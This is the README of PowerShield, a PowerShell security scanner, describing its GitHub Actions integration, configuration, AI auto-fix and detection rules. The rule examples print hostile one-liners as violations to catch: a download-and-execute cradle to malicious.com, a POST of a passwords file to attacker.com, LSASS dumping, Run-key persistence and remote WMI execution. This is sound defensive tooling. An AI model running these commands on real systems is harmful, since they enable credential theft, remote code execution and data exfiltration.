# PowerShield - Comprehensive PowerShell Security Platform

![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/J-Ellette/PowerShellTestingSuite/powershell-security.yml?branch=main)
![License](https://img.shields.io/github/license/J-Ellette/PowerShellTestingSuite)
![Version](https://img.shields.io/badge/version-1.2.0-blue) <br>
[![PowerShield - PowerShell Security Analysis](https://github.com/J-Ellette/PowerShellTestingSuite/actions/workflows/powershell-security.yml/badge.svg)](https://github.com/J-Ellette/PowerShellTestingSuite/actions/workflows/powershell-security.yml) <br>
![Static Badge](https://img.shields.io/badge/Language-PowerShell-blue) ![Static Badge](https://img.shields.io/badge/Language-TypeScript-blue)

> **📢 Rebranded from PSTS:** PowerShell Testing Suite (PSTS) is now **PowerShield**. All references, configuration files, and outputs have been updated. See [Migration Guide](docs/MIGRATION_GUIDE.md) for details.

**PowerShield** is a comprehensive security analysis platform for PowerShell scripts that integrates with GitHub Actions, provides AI-powered auto-fixes, and offers multiple deployment options.

## ✨ What's New in v1.2.0

### 🪝 Pre-Commit Hook Integration
- **Local Security Validation**: Analyze scripts before they're committed
- **Configurable Blocking**: Block commits based on severity thresholds
- **Fast Incremental Analysis**: Only analyzes staged files
- **Easy Installation**: One command to install Git hooks
- **Bypass Options**: Flexible options for emergency commits

### 🛡️ Advanced Attack Detection (6 New Rules)
- **Rule 47: PowerShell Obfuscation Detection**: Detects Base64 encoding, string concatenation, character code conversion, format string obfuscation, and string reversal techniques
- **Rule 48: Download Cradle Detection**: Identifies download-and-execute patterns including IEX with WebClient, BitsTransfer chains, and reflective assembly loading
- **Rule 49: Persistence Mechanism Detection**: Detects registry Run keys, scheduled tasks, WMI event subscriptions, and PowerShell profile modifications
- **Rule 50: Credential Harvesting Detection**: Identifies Mimikatz patterns, LSASS dumping, browser credential extraction, and WiFi password dumping
- **Rule 51: Lateral Movement Detection**: Detects remote WMI/CIM execution, PSRemoting, SMB enumeration, and Pass-the-Hash techniques
- **Rule 52: Data Exfiltration Detection**: Identifies DNS tunneling, HTTP POST uploads, cloud storage transfers, and data compression patterns

**Total Security Rules**: 52 (up from 46)  
**MITRE ATT&CK Coverage**: All rules mapped to MITRE ATT&CK framework  
**Comprehensive Documentation**: New [Advanced Attack Detection Guide](docs/ADVANCED_ATTACK_DETECTION.md) with remediation guidance

## ✨ What's New in v1.1.0

### 🤖 Real AI Auto-Fix
- **Multi-Provider AI Integration**: GitHub Models, OpenAI, Azure OpenAI, Anthropic Claude
- **Intelligent Fix Generation**: Context-aware security fixes with confidence scoring
- **Template Fallback**: Automatic fallback to rule-based fixes if AI unavailable
- **Configurable per Rule**: Enable/disable auto-fix for specific rules

### ⚙️ Configuration System
- **Hierarchical Configuration**: Global → Project → Local `.powershield.yml` files
- **Rule Customization**: Enable/disable rules, override severity levels
- **Flexible Analysis**: Configure thresholds, exclusions, timeouts
- **CI/CD Integration**: Fail pipelines on specific severities

### 🔕 Suppression Comments
- **Multiple Formats**: Next-line, inline, and block suppressions
- **Expiry Dates**: Automatically expire suppressions with warnings
- **Justification Required**: Enforce documentation of security exceptions
- **Audit Reports**: Track and report all suppressions

## 🎯 Features

### Phase 1: GitHub Workflow Integration ✅
- **Automated Security Analysis**: Runs on every push and pull request
- **52 Security Rules**: Comprehensive PowerShell security coverage
  - **Core Rules (4)**: Insecure hashing, credential exposure, command injection, certificate validation
  - **PowerShell-Specific Rules (42)**: Execution policy bypass, unsafe remoting, version downgrades, privilege escalation, and more
  - **Advanced Attack Detection (6)**: Obfuscation, download cradles, persistence, credential harvesting, lateral movement, data exfiltration
- **SARIF Output**: Integrates with GitHub Security tab
- **AI-Powered Auto-Fix**: Automatically generates and applies security fixes with multiple AI providers
- **Configuration System**: Flexible YAML-based configuration with hierarchical support
- **Suppression Comments**: Document and track security exceptions with expiry dates
- **Pre-Commit Hooks**: Local validation before commits with configurable blocking
- **CLI Tools**: Command-line interface for analysis, configuration, and hook management
- **PR Comments**: Detailed analysis results posted to pull requests
- **Human-Readable Reports**: Markdown reports with actionable recommendations

### Coming Soon
- **Phase 2**: VS Code Extension with real-time analysis
- **Phase 3**: Standalone desktop application with Docker isolation

## 🚀 Quick Start

### 1. Add to Your Repository

Create `.github/workflows/powershell-security.yml`:

```yaml
name: PowerShell Security Analysis

on: [push, pull_request]

permissions:
  contents: read
  security-events: write
  pull-requests: write

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    
    - name: Run PowerShield Analysis
      shell: pwsh
      run: |
        Import-Module ./src/PowerShellSecurityAnalyzer.psm1 -Force
        $result = Invoke-WorkspaceAnalysis -WorkspacePath "."
        
        # Export results
        $result | ConvertTo-Json -Depth 10 | Out-File 'powershield-results.json'
        
        # Generate SARIF
        . ./scripts/Convert-ToSARIF.ps1
        Convert-ToSARIF -InputFile 'powershield-results.json' -OutputFile 'powershield-results.sarif'
    
    - name: Upload SARIF
      uses: github/codeql-action/upload-sarif@v3
      with:
        sarif_file: powershield-results.sarif
```

### 2. Analyze Local Scripts

```powershell
# Import the analyzer
Import-Module ./src/PowerShellSecurityAnalyzer.psm1

# Analyze a single script
$result = Invoke-SecurityAnalysis -ScriptPath "./MyScript.ps1"

# View violations
$result.Violations | Format-Table RuleId, Severity, LineNumber, Message

# Analyze entire workspace
$workspaceResult = Invoke-WorkspaceAnalysis -WorkspacePath "."
Write-Host "Total violations: $($workspaceResult.TotalViolations)"

# Enable suppressions
$result = Invoke-SecurityAnalysis -ScriptPath "./MyScript.ps1" -EnableSuppressions
```

### 3. Use CLI Tools

PowerShield includes a command-line interface for local development:

```bash
# Analyze files
pwsh powershield.ps1 analyze ./scripts

# Install pre-commit hook
pwsh powershield.ps1 install-hooks

# Validate configuration
pwsh powershield.ps1 config validate

# Show help
pwsh powershield.ps1 help
```

### 4. Enable Pre-Commit Hooks

Get immediate feedback before committing:

```bash
# Install the hook
pwsh powershield.ps1 install-hooks

# Now commits are automatically checked
git add script.ps1
git commit -m "Add script"
# Hook runs automatically and blocks if violations found
```

Configure hook behavior in `.powershield.yml`:

```yaml
hooks:
  enabled: true
  block_on: ["Critical", "High"]  # Block commits with these severities
  auto_fix: false
```

See [Pre-Commit Hook Guide](docs/PRE_COMMIT_HOOK_GUIDE.md) for details.

## 📖 Documentation

- **[Configuration Guide](docs/CONFIGURATION_GUIDE.md)** - Configure PowerShield with `.powershield.yml`
- **[AI Auto-Fix Guide](docs/AI_AUTOFIX_GUIDE.md)** - Setup and use AI-powered fixes
- **[Suppression Guide](docs/SUPPRESSION_GUIDE.md)** - Document security exceptions
- **[Pre-Commit Hook Guide](docs/PRE_COMMIT_HOOK_GUIDE.md)** - Local validation before commits
- **[Example Configuration](.powershield.yml.example)** - Complete configuration template

## 🔧 Configuration

PowerShield supports flexible configuration through `.powershield.yml` files:

```yaml
# .powershield.yml
version: "1.0"

analysis:
  severity_threshold: "High"
  exclude_paths:
    - "vendor/**"
    - "build/**"

rules:
  InsecureHashAlgorithms:
    enabled: true
    severity: "High"
  
  CommandInjection:
    enabled: true
    severity: "Critical"

autofix:
  enabled: true
  provider: "github-models"  # Free with GITHUB_TOKEN
  model: "gpt-4o-mini"
  confidence_threshold: 0.8
  fallback_to_templates: true

suppressions:
  require_justification: true
  max_duration_days: 90
  allow_permanent: false

hooks:
  enabled: true
  block_on: ["Critical", "High"]
```

**Configuration Hierarchy** (later overrides earlier):
1. Default configuration
2. Global: `~/.powershield.yml`
3. Project: `.powershield.yml`
4. Local: `.powershield.local.yml`

See [Configuration Guide](docs/CONFIGURATION_GUIDE.md) for details.

## 🤖 AI Auto-Fix

PowerShield can automatically fix security violations using AI:

### Supported Providers

| Provider | Setup | Cost |
|----------|-------|------|
| GitHub Models | Uses `GITHUB_TOKEN` | Free tier |
| OpenAI | `OPENAI_API_KEY` | Pay per use |
| Azure OpenAI | Azure credentials | Enterprise |
| Anthropic Claude | `ANTHROPIC_API_KEY` | Pay per use |
| Template-based | No setup | Free (fallback) |

### Usage

```yaml
# In GitHub Actions
- name: Auto-Fix Violations
  uses: ./actions/copilot-autofix
  with:
    github-token: ${{ secrets.GITHUB_TOKEN }}
    violations-file: powershield-results.json
    apply-fixes: true  # or false for preview
```

```powershell
# Command line preview
node actions/copilot-autofix/dist/index.js \
  --violations-file powershield-results.json \
  --apply-fixes false
```

See [AI Auto-Fix Guide](docs/AI_AUTOFIX_GUIDE.md) for complete setup.

## 🔕 Suppression Comments

Document and track security exceptions with suppression comments:

```powershell
# POWERSHIELD-SUPPRESS-NEXT: InsecureHashAlgorithms - Legacy system requirement
$hash = Get-FileHash -Path "file.txt" -Algorithm MD5

# Inline suppression
$password = "test" # POWERSHIELD-SUPPRESS: CredentialExposure - Test credential

# Block suppression
# POWERSHIELD-SUPPRESS-START: CommandInjection - Validated input only
Invoke-Expression $validatedCommand
# POWERSHIELD-SUPPRESS-END

# With expiry date
# POWERSHIELD-SUPPRESS-NEXT: InsecureHashAlgorithms - Until migration (2025-12-31)
$hash = Get-FileHash -Algorithm SHA1 "data.bin"
```

### Features

- **Multiple formats**: Next-line, inline, and block
- **Expiry dates**: Automatic expiration with warnings
- **Justification required**: Enforce documentation
- **Audit reports**: Track all suppressions

```powershell
# Enable in analysis
$result = Invoke-SecurityAnalysis -ScriptPath "script.ps1" -EnableSuppressions
```

See [Suppression Guide](docs/SUPPRESSION_GUIDE.md) for syntax details.

## 📋 Security Rules

### 1. Insecure Hash Algorithms
**Severity**: High  
**Description**: Detects usage of MD5, SHA1, and other cryptographically weak algorithms

**Example Violation**:
```powershell
# ❌ Bad - Uses insecure MD5
$hash = Get-FileHash -Path "file.txt" -Algorithm MD5

# ✅ Good - Uses secure SHA256
$hash = Get-FileHash -Path "file.txt" -Algorithm SHA256
```

### 2. Credential Exposure
**Severity**: Critical  
**Description**: Detects plaintext credential handling

**Example Violation**:
```powershell
# ❌ Bad - Plaintext password
$password = ConvertTo-SecureString "Password123" -AsPlainText -Force

# ✅ Good - Secure password input
$password = Read-Host "Enter password" -AsSecureString
```

### 3. Command Injection
**Severity**: Critical  
**Description**: Detects unsafe use of Invoke-Expression with variables

**Example Violation**:
```powershell
# ❌ Bad - Command injection risk
$userInput = Read-Host "Enter command"
Invoke-Expression $userInput

# ✅ Good - Use safer alternatives
& { Get-Process }
```

### 4. Certificate Validation
**Severity**: High  
**Description**: Detects certificate validation bypasses

**Example Violation**:
```powershell
# ❌ Bad - Bypasses certificate validation
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

# ✅ Good - Implement proper validation
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {
    param($sender, $cert, $chain, $errors)
    # Implement proper certificate validation
    return $errors -eq [System.Net.Security.SslPolicyErrors]::None
}
```

### 5. Execution Policy Bypass ⭐ NEW
**Severity**: Critical  
**Description**: Detects attempts to bypass PowerShell execution policy

**Example Violation**:
```powershell
# ❌ Bad - Bypasses execution policy
Set-ExecutionPolicy Bypass -Force

# ✅ Good - Use appropriate policy
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

### 6. Unsafe PowerShell Remoting ⭐ NEW
**Severity**: Critical  
**Description**: Detects insecure PowerShell remoting configurations

**Example Violation**:
```powershell
# ❌ Bad - Remoting without SSL
Enter-PSSession -ComputerName Server01 -UseSSL:$false

# ✅ Good - Use SSL encryption
Enter-PSSession -ComputerName Server01 -UseSSL
```

### 7. PowerShell Version Downgrade ⭐ NEW
**Severity**: Critical  
**Description**: Detects PowerShell v2 usage which bypasses modern security features

**Example Violation**:
```powershell
# ❌ Bad - Uses vulnerable PowerShell v2
powershell.exe -version 2 -command "malicious code"

# ✅ Good - Use modern PowerShell
pwsh -command "safe code"
```

### 8. Privilege Escalation ⭐ NEW
**Severity**: Critical  
**Description**: Detects attempts to elevate privileges

**Example Violation**:
```powershell
# ❌ Bad - Elevates without validation
Start-Process -FilePath "cmd.exe" -Verb RunAs

# ✅ Good - Check if elevation is necessary
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Handle appropriately
}
```

### 9-16. Additional PowerShell-Specific Rules ⭐ NEW
- **Script Block Logging**: Detects disabled security logging
- **Dangerous Modules**: Identifies imports from untrusted sources
- **Unsafe Deserialization**: Finds unsafe XML/CLIXML deserialization
- **Script Injection**: Detects dynamic script generation vulnerabilities
- **Unsafe Reflection**: Finds unsafe .NET reflection usage
- **Constrained Mode**: Detects patterns breaking constrained language mode
- **Unsafe File Inclusion**: Identifies dot-sourcing of untrusted scripts
- **PowerShell Web Requests**: Detects unvalidated web requests

### 47-52. Advanced Attack Detection Rules 🛡️ NEW

#### 47. PowerShell Obfuscation Detection
**Severity**: Critical  
**MITRE ATT&CK**: T1027, T1027.010, T1059.001  
**Description**: Detects obfuscation techniques used to hide malicious code

**Patterns Detected**:
- Base64 encoded commands (`-EncodedCommand`, `FromBase64String`)
- Excessive string concatenation (5+ operations)
- Character code conversion (multiple `[char]` casts)
- Format string obfuscation (5+ placeholders)
- String reversal (`ToCharArray`, `Reverse`)

**Example**:
```powershell
# ❌ Bad - Base64 encoded malicious command
powershell.exe -enc "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="

# ✅ Good - Clear, readable code
Invoke-WebRequest -Uri "https://example.com"
```

#### 48. Download Cradle Detection
**Severity**: Critical  
**MITRE ATT&CK**: T1105, T1059.001, T1204.002, T1027.004, T1620, T1197  
**Description**: Detects download cradles that fetch and execute remote code

**Patterns Detected**:
- `IEX (New-Object Net.WebClient).DownloadString(...)`
- Web requests piped to IEX
- BitsTransfer followed by execution
- Reflective assembly loading from web

**Example**:
```powershell
# ❌ Bad - Download and execute without disk access
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')

# ✅ Good - Download with validation
$script = Invoke-WebRequest -Uri "https://trusted.com/script.ps1"
# Review content before execution
```

#### 49. Persistence Mechanism Detection
**Severity**: Critical  
**MITRE ATT&CK**: T1547.001, T1053.005, T1546.003  
**Description**: Detects persistence techniques that survive reboots

**Patterns Detected**:
- Registry Run key modifications
- Scheduled task creation
- WMI event subscriptions
- PowerShell profile modifications
- Startup folder changes

**Example**:
```powershell
# ❌ Bad - Creates persistence via registry
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\malware.exe"

# ✅ Good - Use legitimate installation methods
# Install through proper package management
```

#### 50. Credential Harvesting Detection
**Severity**: Critical  
**MITRE ATT&CK**: T1003.001, T1003.002, T1555.003  
**Description**: Detects credential theft and password dumping

**Patterns Detected**:
- Mimikatz keywords and patterns
- LSASS process dumping
- Browser credential extraction
- WiFi password dumping
- Registry hive extraction (SAM, SYSTEM)

**Example**:
```powershell
# ❌ Bad - Dumps LSASS memory
Get-Process lsass | Out-Minidump -DumpFilePath C:\Temp\lsass.dmp

# ✅ Good - Use proper credential management
$cred = Get-Credential
# Use SecureString for credentials
```

#### 51. Lateral Movement Detection
**Severity**: Critical  
**MITRE ATT&CK**: T1021.006, T1021.002, T1047  
**Description**: Detects techniques to spread across networks

**Patterns Detected**:
- Remote WMI/CIM execution
- Remote scheduled tasks
- SMB share enumeration
- PSRemoting with credentials
- Pass-the-Hash techniques

**Example**:
```powershell
# ❌ Bad - Remote execution without proper authorization
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe" -ComputerName "target-server"

# ✅ Good - Use authorized remote management
Enter-PSSession -ComputerName "authorized-server" -ConfigurationName "RestrictedEndpoint"
```

#### 52. Data Exfiltration Detection
**Severity**: Critical  
**MITRE ATT&CK**: T1048.003, T1041, T1567.001  
**Description**: Detects data exfiltration to external locations

**Patterns Detected**:
- DNS tunneling (DNS queries in loops)
- HTTP POST with large data
- Pastebin/GitHub Gist uploads
- Cloud storage uploads (Dropbox, S3, Azure Blob)
- Email with attachments
- Data compression before upload

**Example**:
```powershell
# ❌ Bad - Exfiltrates data to external site
$data = Get-Content "C:\Sensitive\passwords.txt"
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $data

# ✅ Good - Use authorized data transfer methods
# Transfer data through approved channels with proper logging
```

For detailed examples of all rules, see the [test scripts](tests/TestScripts/) organized by category:
- [PowerShell-specific rules](tests/TestScripts/powershell/)
- [Network security rules](tests/TestScripts/network/)
- [File system security rules](tests/TestScripts/filesystem/)
- [Registry security rules](tests/TestScripts/registry/)
- [Data security rules](tests/TestScripts/data/)

## 🤖 AI Auto-Fix

PowerShield includes an AI-powered auto-fix action that can automatically remediate security violations:

```yaml
- name: Apply AI Fixes
  uses: ./actions/copilot-autofix
  with:
    github-token: ${{ secrets.GITHUB_TOKEN }}
    violations-file: 'powershield-results.json'
    apply-fixes: true
    confidence-threshold: 0.8
```

**Features**:
- Generates fixes based on security best practices
- Confidence scoring for each fix
- Applies fixes only when confidence threshold is met
- Creates detailed commit messages

## 📊 SARIF Integration

PowerShield generates SARIF (Static Analysis Results Interchange Format) output that integrates with GitHub's Security tab:

1. Results appear in the **Security** → **Code scanning** tab
2. Violations are annotated directly in pull requests
3. Track security trends over time
4. Filter by severity, rule, and file

## ⚙️ Configuration

PowerShield includes configurable options for customizing analysis behavior.

### Excluded Paths

By default, PowerShield excludes test scripts from workspace analysis to avoid flagging intentional violations used for testing:

```powershell
# Default exclusions
$analyzer.Configuration.ExcludedPaths = @(
    'tests/TestScripts',
    '*/TestScripts',
    'test/*',
    'tests/*'
)
```

Test scripts are still analyzed individually in the `test-analyzer` workflow job to verify the scanner is working correctly.

### Custom Configuration

```powershell
# Create analyzer with custom configuration
$analyzer = New-SecurityAnalyzer
$analyzer.Configuration.MaxFileSize = 20MB
$analyzer.Configuration.TimeoutSeconds = 60
$analyzer.Configuration.ExcludedPaths += 'vendor/*'
```

## 🛠️ Development

### Project Structure
```
PowerShellTestingSuite/
├── .github/workflows/       # GitHub Actions workflows
├── actions/                 # Custom GitHub Actions
│   └── copilot-autofix/    # AI auto-fix action
├── src/                     # Core analyzer module
│   └── PowerShellSecurityAnalyzer.psm1
├── scripts/                 # Utility scripts
│   ├── Convert-ToSARIF.ps1
│   └── Generate-SecurityReport.ps1
├── tests/                   # Test scripts
│   └── TestScripts/        # Scripts with known violations (organized by category)
│       ├── powershell/     # PowerShell-specific security tests
│       ├── network/        # Network security tests
│       ├── filesystem/     # File system security tests
│       ├── registry/       # Registry security tests
│       └── data/           # Data security tests
└── buildplans/             # Technical documentation
```

### Running Tests

```powershell
# Test the analyzer on sample vulnerable scripts
pwsh -Command "
    Import-Module ./src/PowerShellSecurityAnalyzer.psm1
    Get-ChildItem ./tests/TestScripts -Filter *.ps1 -Recurse | ForEach-Object {
        Write-Host \"Testing: $($_.FullName)\"
        $result = Invoke-SecurityAnalysis -ScriptPath $_.FullName
        Write-Host \"  Violations: $($result.Violations.Count)\"
    }
"
```

### Building the Auto-Fix Action

```bash
cd actions/copilot-autofix
npm install
npm run build
```

## 📖 Documentation

- **[Technical Plan](buildplans/TechnicalPlan.md)**: Complete implementation roadmap
- **[Phase 1 Plan](buildplans/SoftwarePlan/Phase_1_GitHub_Workflow_Implementation.md)**: Detailed GitHub integration plan
- **[copilot.md](copilot.md)**: Implementation guide for developers

## 🔐 Security

PowerShield is designed with security in mind:
- No external dependencies for core analysis
- Runs in isolated containers (Phase 3)
- No data sent to external services
- All processing happens locally or in GitHub Actions

## 🤝 Contributing

Contributions are welcome! Please see our contributing guidelines.

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests for new features
5. Submit a pull request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🗺️ Roadmap

- [x] **Phase 1**: GitHub Workflow Integration
  - [x] Core security analyzer
  - [x] GitHub Actions workflow
  - [x] SARIF output
  - [x] AI auto-fix action
  
- [ ] **Phase 2**: VS Code Extension
  - [ ] Real-time analysis
  - [ ] Multi-AI provider support
  - [ ] Code actions and quick fixes
  
- [ ] **Phase 3**: Standalone Application
  - [ ] Electron desktop app
  - [ ] Docker sandbox isolation
  - [ ] Local AI integration
  - [ ] Enterprise features

## 💬 Support

- 📚 [Documentation](https://github.com/J-Ellette/PowerShellTestingSuite/wiki)
- 🐛 [Issue Tracker](https://github.com/J-Ellette/PowerShellTestingSuite/issues)
- 💡 [Discussions](https://github.com/J-Ellette/PowerShellTestingSuite/discussions)

---

**Made with ❤️ for PowerShell security**
